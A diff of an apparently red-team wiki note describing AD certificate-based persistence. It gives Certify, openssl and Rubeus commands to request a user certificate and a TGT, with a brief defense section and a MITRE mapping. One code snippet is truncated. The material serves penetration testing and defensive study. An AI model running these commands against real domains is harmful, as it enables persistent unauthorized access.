@@ -39,11 +39,15 @@ To request a user certificate and TGT, the attacker must have access to a domain
 
 This technique can be valuable to attackers because it allows them to maintain access to the domain without needing to rely on stolen credentials or other techniques that can be easily detected and blocked. It can also be difficult for defenders to detect, as the certificates and tickets can appear legitimate and may not be flagged by security tools.
 
+ 
+
 ## Requirements
 
 1. Access to a domain-joined computer
 
 1. Valid domain credentials
+
+ 
 
 ## Defense
 
@@ -53,20 +57,32 @@ This technique can be valuable to attackers because it allows them to maintain a
 
 1. Implement multi-factor authentication to prevent unauthorized access to user accounts
 
+ 
+
 ## Objectives
 
 1. Maintain persistent access to a compromised Windows domain
 
 1. Authenticate to the domain without needing to provide valid credentials
 
+ 
+
 # Instructions
 
 1. To request a certificate for the User template, run the command: .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User. After obtaining the certificate, convert it for Rubeus by running the command: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx. Finally, request a TGT using the certificate by running the command: .\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
 
+ 
+
+
+
 **Code**: [[# Request a certificate for the User template
 .\Ce]]
 
+
+
 > This command is used to request a certificate for the User template, which can then be used to request a Ticket Granting Ticket (TGT) using Rubeus. The command involves three steps: requesting the certificate, converting it for Rubeus, and using it to request a TGT. The 'Certify.exe' tool is used to request the certificate, 'openssl' is used to convert it for Rubeus, and 'Rubeus.exe' is used to request the TGT. The command arguments include the CA server, the certificate template, the user name, and the password.
+
+
 
 **Command** ([[Request certificate for User template]]):
 
@@ -74,17 +90,27 @@ This technique can be valuable to attackers because it allows them to maintain a
 .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User
 ```
 
+
+
+
+
 **Command** ([[Convert certificate for Rubeus]]):
 
 ```bash
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 
+
+
+
+
 **Command** ([[Request TGT using certificate]]):
 
 ```bash
 .\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -112,3 +138,5 @@ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provid
 - [[Domain]]
 - [[User Certificate]]
 - [[Windows - Persistence]]
+
+
